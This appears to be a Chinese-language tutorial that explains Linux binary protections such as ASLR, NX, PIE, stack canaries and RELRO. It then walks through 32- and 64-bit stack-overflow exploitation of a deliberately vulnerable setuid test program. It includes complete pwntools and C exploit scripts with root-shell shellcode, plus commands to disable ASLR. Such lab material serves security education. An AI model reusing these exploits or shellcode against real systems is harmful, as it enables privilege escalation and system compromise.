# 常见保护措施

## ASLR

ASLR
是一种防范内存损坏漏洞被利用的计算机安全技术。ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数，以防范恶意程序对已知地址进行Return-to-libc攻击。ASLR在每次启动操作系统时会随机化加载应用程序的基地址和dll，只能随机化 堆、栈、共享库的基址。

Linux下查看:

    
    
    cat /proc/sys/kernel/randomize_va_space
    

值为0表示未开启，值为1表示半开启，仅随机化栈和共享库，值为2表示全开启，随机化堆、栈和共享库

Windows下默认开启ASLR

关闭方法：

“开始”——>“设置”——>“更新与安全”——>“windows安全中心”——>“打开windows安全中心”——>“应用与浏览器控制”——>“Exploit
Protection设置”

强制映像随机化默认关闭，只需关闭随机化内存分配和高熵ASLR即可，如图：

![image](https://image.3001.net/images/20220111/1641905332_61dd7cb459c2c030318c0.png!small)

使用CFF explorer，取消勾选"DLL can move"的复选框，如图：

![image](https://image.3001.net/images/20220111/1641905362_61dd7cd2263cdd56c65f6.png!small)

修改`HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\Memory Management`

关闭：`"MoveImages"=dword:00000000`

开启：`"MoveImages"=-`

## DEP

数据执行保护（DEP）是一组对内存进行额外检查的硬件和软件技术，以帮助防止恶意代码在系统上运行。

## NX

No-Execute（不可执行），NX的原理是将数据所在内存页标识为不可执行，当程序执行流被劫持到栈上时，程序会尝试在数据页面上执行指令，因为数据页被标记为不可知性，此时CPU就会抛出异常，而不是去执行栈上数据。

未启用时：栈可以执行，栈上的数据也可以被当作代码执行。

启用时：栈不可执行，栈上的数据程序只认为是数据，如果去执行的话会发生错误。即栈上的数据不可以被当作代码执行。

    
    
    ## 栈可执行：NX disabled
    gcc -z execstack
    ## 栈不可执行：NX enabled（默认选项）
    gcc -z noexecstack
    

## PIE

PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE /
-fpie），作用于编译过程，可将其理解为特殊的 PIC（so专用，Position Independent Code），加了 PIE 选项编译出来的
ELF 用 file 命令查看会显示其为 so，其随机化了 ELF 装载内存的基址（代码段、plt、got、data 等共同的基址）。其效果为用
objdump、IDA 反汇编之后的地址是用偏移表示的而不是绝对地址。

启用时：代码段、plt、got、data 等共同的基址会随机化。在编译后的程序中，只保留指令、数据等的偏移，而不是绝对地址的形式。

    
    
    ## 关闭：No PIE（默认选项）
    -no-pie
    ## 开启：PIE enabled
    -fpie -pie / -fPIE -pie 
    ## 笔者并不知道这两个选项有什么区别，在用不同选项编译一个程序时他们两个的 hash 居然都一样，所以在此求教各位。
    

## Canary

金丝雀保护，开启这个保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie
信息是否合法，如果不合法就停止程序运行。真正的 cookie 信息也会保存在程序的某个位置。插入栈中的 cookie 一般在 ebp/rbp
之上的一个内存单元保存。

部分函数保护：在一些容易受到攻击的函数返回地址之前添加 cookie 。在函数返回时，检查该 cookie 与原本程序插入该位置的 cookie
是否一致，若一致则程序认为没有受到栈溢出攻击。

所有函数保护：有的自定义函数在返回地址之前都会添加 cookie 。在函数返回时，检查该 cookie 与原本程序插入该位置的 cookie
是否一致，若一致则程序认为没有受到栈溢出攻击。

    
    
    ## 无 canary 保护：No canary found
    -fno-stack-protector(无) / -fstack-protector(无)
    ## 部分 canary 保护：Canary found（默认选项）
    -fstack-protector-strong
    ## 全部 canary 保护：Canary found
    -fstack-protector-all
    

## RELRO

设置符号重定位表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。

未开启：在这种模式下关于重定位并不进行任何保护。

部分开启：在这种模式下，一些段 (包括.dynamic) 在初始化后将会被标识为只读。

全部开启：在这种模式下，除了会开启部分保护外。惰性解析会被禁用（所有的导入符号将在开始时被解析，.got.plt
段会被完全初始化为目标函数的终地址，并被标记为只读）。此外，既然惰性解析被禁用，GOT[1] 与 GOT[2] 条目将不会被初始化为提到的值。

    
    
    ## 关闭： No RELRO
    -z norelro
    ## 开启： Partial RELRO(默认选项)
    -z lazy
    ## 完全开启： Full RELRO
    -z now
    

# Linux下32位程序栈溢出

## 漏洞代码

    
    
    #include <stdio.h>
    #include <string.h>
    void success()
    {
        puts("Success!\n");
    }
    void vuln(char *p)
    {
        char buff[100];
        char buff2[100];
        strcpy(buff,p);
    }
    int main(int argc, char **argv)
    {
        if(argc<2)
        {
            printf("Usage: %s <String>\n",argv[0]);
            return 0;
        }
        vuln(argv[1]);
        return 0;
    }
    

## 无保护编译

`gcc pwn_1.c -o pwn_1 -m32 -z execstack -z norelro -no-pie`

## 赋予程序特权

    
    
    sudo chown 0:0 pwn_1
    sudo chmod 4755 pwn_1
    

## 查看保护

程序为32位小端序，未启用任何保护，如图：

![image](https://image.3001.net/images/20220111/1641905970_61dd7f3297642382a5c41.png!small)

## 关闭操作系统ASLR

    
    
    sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
    

## 内存结构

![image](https://image.3001.net/images/20220111/1641905729_61dd7e410082a288352d1.png!small)

## Shellcode布局方式

1、Payload=填充数据+shellcode+填充数据+jmp esp地址  
![image](https://image.3001.net/images/20220111/1641906018_61dd7f625c01fdba73e5b.png!small)  
2、Payload=填充数据+jmp esp地址+ shellcode  
![image](https://image.3001.net/images/20220111/1641906030_61dd7f6e82a935c5ca910.png!small)

## 定位溢出点

查看main函数：`disassemble main`  
设置断点：`b \*0x0804918c`(随便设置一个断点)

  1. 生成200个字符，如图：  
![image](https://image.3001.net/images/20220111/1641907046_61dd83666f08ae71172fa.png!small)

  2. 作为参数传入程序，使程序奔溃，此时EIP为的值为：`daab`，也就是EBP的下4个字节，如图：  
![image](https://image.3001.net/images/20220111/1641907057_61dd8371b8a7ae2b2d46b.png!small)

  3. 计算偏移量，如图：  
![image](https://image.3001.net/images/20220111/1641907182_61dd83eeac21a271b5677.png!small)

## 控制EIP

  1. 传入112个A字符和4个B字符覆盖EIP，和若干C字符，成功使用4个B字符覆盖EIP，此时字符C在ESP中，如图：  
![image](https://image.3001.net/images/20220111/1641907214_61dd840e3889e8d95f93a.png!small)

  2. 查找success函数地址，将EIP的值覆盖为success函数的地址，从而调用success函数，如图：  
![image](https://image.3001.net/images/20220111/1641907249_61dd8431d55dceacdf89e.png!small)  
![image](https://image.3001.net/images/20220111/1641907264_61dd8440087499ba2638f.png!small)

## 定位shellcode空间

  1. 使用第一种shellcode布局方式部署shellcode，此时EAX到EDX都出现填充字节，如图：  
![image](https://image.3001.net/images/20220111/1641907299_61dd84638d3b3ffeadc61.png!small)

  2. 查看EAX寄存器的值发现shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641907312_61dd8470a2bf0ab830faa.png!small)

  3. 使用第二种shellcode布局方式部署shellcode，此时ESP指向shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641907323_61dd847bd6461a19377a9.png!small)

  4. 查看ESP寄存器的值发现shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641907347_61dd84930d2b7228580a5.png!small)

## 检测坏字节

  1. 第一种shellcode布局方式下使用String+填充数据检测坏字节，没有坏字节的情况下数据没有被截断，会造成奔溃，如图：  
![image](https://image.3001.net/images/20220111/1641907413_61dd84d596e156778599f.png!small)

  2. 有坏字节的情况下数据被截断，不会造成奔溃，如图：  
![image](https://image.3001.net/images/20220111/1641907732_61dd8614deb0d455cd336.png!small)

  3. 第二种shellcode布局方式下使用填充数据+String检测坏字节，在`0x08`之后的数据被截断，说明坏字节是`0x09`，如图：  
![image](https://image.3001.net/images/20220111/1641907746_61dd862254c76c0596b7e.png!small)

  4. `0x1f`之后的数据被截断，说明坏字节是`0x20`，如图：  
![image](https://image.3001.net/images/20220111/1641907758_61dd862e24874952d1f92.png!small)

  5. 之后就没有坏字节了，如图：  
![image](https://image.3001.net/images/20220111/1641907773_61dd863d11afadc991902.png!small)

  6. 本程序中的坏字节如下：

    
    
    0x00,0x09,0x0a,0x20
    

## Get Shell

  1. 使用第一种布局方式时，覆盖EIP的值为EAX寄存器的地址即可执行shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641907787_61dd864b13bbc9db0247c.png!small)

  2. 查看程序汇编代码，查找跳转到EAX寄存器的指令地址，如图：  
![image](https://image.3001.net/images/20220111/1641907800_61dd86580b68cf54618ab.png!small)

  3. 覆盖EIP的值为`call *%eax`指令地址即可执行shellcode（可绕过操作系统ASLR），如图：  
![image](https://image.3001.net/images/20220111/1641907816_61dd866876b212576bfcd.png!small)

  4. 使用第二种布局方式时，覆盖EIP的值为ESP寄存器的地址即可执行shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641907836_61dd867c7116c27d320a0.png!small)

  5. 使用EDB打开程序，如图：  
![image](https://image.3001.net/images/20220111/1641907846_61dd8686185132f8f6ea8.png!small)

  6. 运行之后查找`jmp esp`指令的地址，如图：  
![image](https://image.3001.net/images/20220111/1641907859_61dd8693c00ffed5b1d63.png!small)

  7. 覆盖EIP的值为`jmp esp`指令地址即可执行shellcode（可绕过操作系统ASLR），如图：  
![image](https://image.3001.net/images/20220111/1641907869_61dd869d7db8d4ac09822.png!small)

## EXP

### 第一种布局方式Python利用代码

    
    
    #!/usr/bin/python3
    from pwn import *
    # 偏移量
    offset=112
    # call eax地址
    eax=0x8049019
    sc=b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
    pad=b'\x90'*8+sc+b'\x90'*(offset-40)
    
    buffer=pad+p32(eax)
    
    p=process(['./pwn_1',buffer])
    p.interactive()
    

### 第二种布局方式Python利用代码

    
    
    #!/usr/bin/python3
    from pwn import *
    
    offset=112
    esp=0x804a087
    sc=b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
    pad=b'\x90'*offset
    
    buffer=pad+p32(esp)+sc
    
    p=process(['./pwn_1',buffer])
    p.interactive()
    

### 第一种布局方式C利用代码

    
    
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    
    int main(int argc,char **argv)
    {
    	// 偏移量
    	int offset=112;
    	// call eax地址
    	char eax_addr[]="\x19\x90\x04\x08";
    	// shellcode
    	char sc[]="\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
    	char buff[200];
    	// 将buff全部设置为Nop
    	memset(buff,0x90,200);
    	// 在第8个字符后面放置shellcode
    	memcpy(buff+8,sc,32);
    	// 在第112个字符后放置call eax地址
    	memcpy(buff+offset,eax_addr,4);
    	// 运行第一个参数指向的程序，并将buff传入程序
    	execl(argv[1],argv[1],buff,NULL);
    	return 0;
    }
    

### 第二种布局方式C利用代码

    
    
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    
    int main(int argc,char **argv)
    {
    	// 偏移量
    	int offset=112;
    	// jmp esp地址
    	char esp_addr[]="\x87\xa0\x04\x08";
    	// shellcode
    	char sc[]="\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
    	char buff[400];
    	// 将buff全部设置为Nop
    	memset(buff,0x90,400);
    	// 在第112个字符后放置jmp esp地址
    	memcpy(buff+offset,esp_addr,4);
    	// 在第116个字符后面放置shellcode
    	memcpy(buff+116,sc,32);
    	
    	// 运行第一个参数指向的程序，并将buff传入程序
    	execl(argv[1],argv[1],buff,NULL);
    	return 0;
    }
    

# Linux下64位程序栈溢出

## 32位和64位的区别

linux_64与linux_86的区别主要有两点：

  1. 首先是内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于`0x00007fffffffffff`，否则会抛出异常。

  2. 其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。

## 漏洞代码

    
    
    #include <stdio.h>
    #include <string.h>
    void success()
    {
        puts("Success!\n");
    }
    void vuln(char *p)
    {
        char buff[100];
        char buff2[100];
        strcpy(buff,p);
    }
    int main(int argc, char **argv)
    {
        if(argc<2)
        {
            printf("Usage: %s <String>\n",argv[0]);
            return 0;
        }
        vuln(argv[1]);
        return 0;
    }
    

## 无保护编译

`gcc pwn_1.c -o pwn_1_x64 -m64 -z execstack -z norelro -no-pie`

## 赋予程序特权

    
    
    sudo chown 0:0 pwn_1_x64
    sudo chmod 4755 pwn_1_x64
    

## 查看保护措施

![image](https://image.3001.net/images/20220111/1641907908_61dd86c47283a21b6c17b.png!small)

## 定位溢出点

  1. 生成200个字符传入使程序奔溃，此时RSP的值为RIP指向的地址，也就是函数返回地址，如图：  
![image](https://image.3001.net/images/20220111/1641907918_61dd86ce9668e484d3028.png!small)

  2. 计算RSP低地址位的4个字节获得偏移量，如图：  
![image](https://image.3001.net/images/20220111/1641907946_61dd86ea380f49385b366.png!small)

## 控制RIP

  1. 传入120个A字符和8个B字符覆盖RIP，成功使用8个B字符覆盖RIP，如图：  
![image](https://image.3001.net/images/20220111/1641907978_61dd870ad579a436b9e74.png!small)

  2. 查找success函数地址，将RIP的值覆盖为success函数的地址，从而调用success函数

    
    
    r `python -c "print 'A'*120+'\x42\x11\x40'"`
    

![image](https://image.3001.net/images/20220111/1641907997_61dd871da4c03481aeb50.png!small)

## 定位shellcode空间

  1. 使用填充数据+shelcode+填充数据+RIP布局方式将Payload传入参数

    
    
    r `python -c "print '\x90'*23+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*70+'\x50\xdf\xff\xff\xff\x7f'"`
    

  2. 程序奔溃时在RAX寄存器中发现填充数据，如图：  
![image](https://image.3001.net/images/20220111/1641908011_61dd872b8beff35e8a56e.png!small)

  3. 查看RAX寄存器内容发现传入的shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641908019_61dd8733425fd44f8e39e.png!small)

## 检查坏字节

和32位程序检查坏字节的方法一样

## Get Shell

  1. 覆盖RIP的值为RAX寄存器的地址即可执行shellcode，如图：  
![image](https://image.3001.net/images/20220111/1641908119_61dd8797c6af4e691aab7.png!small)

  2. 查看程序汇编代码，查找跳转到RAX寄存器的指令地址，如图：  
![image](https://image.3001.net/images/20220111/1641908137_61dd87a9cf6328fcef497.png!small)

  3. 覆盖RIP的值为`callq *%rax`指令地址即可执行shellcode（可绕过操作系统ASLR），不同的shellcode有不同的结果，可能无法获得root权限

    
    
    ./pwn_1_x64 `python -c "print '\x90'*27+'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'+'\x90'*50+'\x10\x10\x40'"`
    

![image](https://image.3001.net/images/20220111/1641908152_61dd87b8e061359a7b5f7.png!small)

## EXP

### Python利用代码

    
    
    #!/usr/bin/python3
    from pwn import *
    
    # call rax地址
    rax=b'\x10\x10\x40'
    # 偏移量
    offset=120
    # 43字节可获得root权限的shellcode
    sc=b'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
    pad=b'\x90'*27+sc+b'\x90'*(offset-27-43)
    
    buff=pad+rax
    
    ret=process(['./pwn_1_x64',buff])
    ret.interactive()
    

### C利用代码

    
    
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    
    int main(int argc,char **argv)
    {
    	// 偏移量
    	int offset=120;
    	// call rax地址
    	char rax_addr[]="\x10\x10\x40";
    	// shellcode
    	char sc[]="\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
    	char buff[200];
    	// 将buff全部设置为Nop
    	memset(buff,0x90,200);
    	// 在第8个字符后面放置shellcode
    	memcpy(buff+8,sc,43);
    	// 在第120个字符后放置call rax地址，长度4和8都可，不足4字节可以填4
    	memcpy(buff+offset,rax_addr,4);
    	// 运行第一个参数指向的程序，并将buff传入程序
    	execl(argv[1],argv[1],buff,NULL);
    	return 0;
    }
    

